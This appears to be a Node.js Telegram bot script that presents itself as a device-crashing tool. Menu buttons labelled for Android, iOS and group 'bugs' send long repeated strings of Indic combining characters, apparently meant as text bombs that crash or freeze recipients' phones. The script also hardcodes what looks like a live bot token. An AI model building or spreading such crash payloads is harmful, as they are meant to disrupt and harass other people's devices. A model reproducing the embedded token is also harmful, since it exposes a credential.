const { Telegraf, Markup } = require('telegraf');

// Ninte Telegram Bot Token ivide paste cheyyuka
const bot = new Telegraf('8196033420:AAE19YyR4MBj6776bZturSMEj4wV-dKW19o');

// 1. Dashboard UI (Mass Look)
const menuText = `┌─────────── AIRA x ADAM ───────────┐
│ 👤 USER   : ADAM [DEV]           │
│ 🤖 STATUS : CRASHIFY BYPASS ON    │
│ 🚀 CORE   : NODE.JS [INDEX.JS]    │
└───────────────────────────────────┘`;

bot.start((ctx) => {
    return ctx.reply(menuText, Markup.keyboard([
        ['|| Bug Android ||', '|| Bug iOS ||'],
        ['|| Bug Group ||', '|| Misc Menu ||']
    ]).resize());
});

// 2. SESSION 1: ANDROID CRASH (Most Powerful)
bot.hears('|| Bug Android ||', (ctx) => {
    ctx.reply("⚠️ EXECUTING ANDROID MEMORY OVERFLOW...");
    // Nullfinity & Crashdroid Mix Payload
    const payload = "ॣ ".repeat(500); 
    for(let i=0; i<10; i++) {
        ctx.reply(payload);
    }
});

// 3. SESSION 2: iOS CRASH (Springboard Lag)
bot.hears('|| Bug iOS ||', (ctx) => {
    ctx.reply("🍎 EXECUTING iOS BYPASS [XIOSVIRUS]...");
    // Special Telugu character lag logic
    const iosPayload = "జ్ఞാ ".repeat(200);
    ctx.reply(iosPayload);
});

// 4. SESSION 3: GROUP CRASH (Mass Bypass)
bot.hears('|| Bug Group ||', (ctx) => {
    ctx.reply("👥 GROUP BYPASS PROTOCOL ACTIVE...");
    ctx.reply("Targeting: Bypassing Security Filters...");
});

bot.launch();
console.log("Aira Bot is Online!");
